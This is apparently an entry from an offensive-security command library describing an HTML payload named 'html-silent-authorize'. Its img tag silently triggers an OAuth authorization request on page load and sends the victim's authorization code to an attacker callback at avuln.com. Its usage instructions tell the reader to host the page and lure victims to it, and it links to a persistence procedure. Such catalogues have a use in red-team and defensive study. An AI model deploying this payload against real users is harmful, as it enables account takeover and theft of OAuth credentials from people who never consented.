---
id: cmd-html-silent-auth-001
data: |-
  <html>
   <img src="https://OAUTH2-PROVIDER-DOMAIN/oauth2/authorize?client_id=%CLIENT_ID%&response_type=code&redirect_uri=https://avuln.com/callback&state=0123456789abcdef">
  </html>
tags:
  - silent-auth
type: command
output: null
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:38.738Z'
verified: false
validated: true
submitted: true
---
# html-silent-authorize

## Command

```html
<html>
 <img src="https://OAUTH2-PROVIDER-DOMAIN/oauth2/authorize?client_id=%CLIENT_ID%&response_type=code&redirect_uri=https://avuln.com/callback&state=0123456789abcdef">
</html>
```

## Description

HTML snippet that silently initiates OAuth authorization via img src, generating a code on page load if victim is authenticated.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| client_id | App ID (replace %CLIENT_ID%) | Yes |
| response_type | 'code' | Yes |
| redirect_uri | Attacker callback | Yes |
| state | CSRF token | Yes |

## Examples

### Basic Usage

Host the HTML on a server and lure victim to visit.

## Expected Output

Browser loads img, triggers redirect to callback with code.

## Related

- [[commands/tail-access-log]]
- [[procedures/Silent-Authorization-Code-Generation-for-Persistence]]
